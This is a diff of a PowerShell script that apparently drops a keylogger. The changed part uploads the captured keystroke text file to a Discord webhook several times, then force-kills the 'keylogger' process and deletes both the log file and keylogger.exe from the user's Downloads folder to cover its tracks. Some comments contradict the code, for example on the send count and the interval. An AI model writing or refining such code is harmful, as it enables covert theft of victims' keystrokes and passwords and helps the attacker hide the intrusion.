@@ -63,21 +63,39 @@ if (Test-Path $downloadPath) {
         Write-Host "Discord Webhook Response: $responseText"
     }
 
-    # Sleep for a few seconds to allow time for the executable to create the text file
-    Start-Sleep -Seconds 10  # Adjust the delay time as needed
+ # Send the file to Discord a maximum of 10 times
+$maxSendCount = 2       # Maximum number of times to send the file
+$sendCount = 0          # Initialize the send count
 
-    # Send the file to Discord every 30 seconds for 5 minutes (10 times)
-    $durationInSeconds = 300  # 5 minutes
-    $intervalInSeconds = 30  # 30 seconds
-    $startTime = Get-Date
+while ($sendCount -lt $maxSendCount) {
+    # Upload the text file to Discord
+    Send-FileToDiscord -WebhookUrl $webhookUrl -FilePath $textFilePath
 
-    while ((Get-Date) -lt ($startTime.AddSeconds($durationInSeconds))) {
-        # Upload the text file to Discord
-        Send-FileToDiscord -WebhookUrl $webhookUrl -FilePath $textFilePath
+    # Increase the send count
+    $sendCount++
 
-        # Sleep for 30 seconds
-        Start-Sleep -Seconds $intervalInSeconds
-    }
+    # Sleep for 30 seconds
+    Start-Sleep -Seconds 5
+}
+# After sending files to Discord 10 times, delete the text file if it still exists
+if (Test-Path -Path $textFilePath) {
+    # Close the 'keylogger.exe' process if it's running
+    Get-Process -Name 'keylogger' | ForEach-Object { Stop-Process -Id $_.Id -Force }
+
+    Remove-Item -Path $textFilePath -Force -ErrorAction SilentlyContinue
+    Write-Host "Deleted $textFilePath"
+} else {
+    Write-Host "Text file not found at $textFilePath"
+}
+
+# Delete the 'keylogger.exe' file from the Downloads folder
+$exeFilePath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\keylogger.exe')
+if (Test-Path -Path $exeFilePath) {
+    Remove-Item -Path $exeFilePath -Force -ErrorAction SilentlyContinue
+    Write-Host "Deleted $exeFilePath"
+} else {
+    Write-Host "Exe file not found at $exeFilePath"
+}
 } else {
     Write-Host 'Download failed. Please check the GitHub URL and try again.'
 }
